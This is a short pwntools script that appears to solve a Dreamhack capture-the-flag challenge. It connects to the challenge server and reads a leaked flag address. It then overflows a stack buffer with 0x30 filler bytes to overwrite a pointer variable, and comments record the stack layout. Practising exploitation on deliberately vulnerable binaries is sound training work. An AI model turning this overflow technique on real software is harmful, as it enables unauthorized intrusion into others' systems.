from pwn import *

# p = process('./chall')
p = remote('host3.dreamhack.games', 16884)
# context.log_level = 'debug'
# checksec-> Full RELRO / No canary / NX, PIE enabled
# maybe 64-bit file

def slog(name, addr) : print(name + ': ' + hex(addr))

p.recvuntil(b'real flag address (mmapped address): ')
rf_addr = int(p.recvline().strip(), 16)
# log.info(hex(ff_addr))
# log.info(hex(buf_addr))
# log.info(hex(rf_addr))

buf = b'A' * 0x30
buf += p64(rf_addr)
p.sendline(buf)

p.interactive()

# stack
# RET[rbp+4] SFP[rbp] fd[rbp-0x4] len[rbp-0x8] fake_flag_addr[rbp-0x10] real_flag_addr[rbp-0x18] buf[rbp-0x40]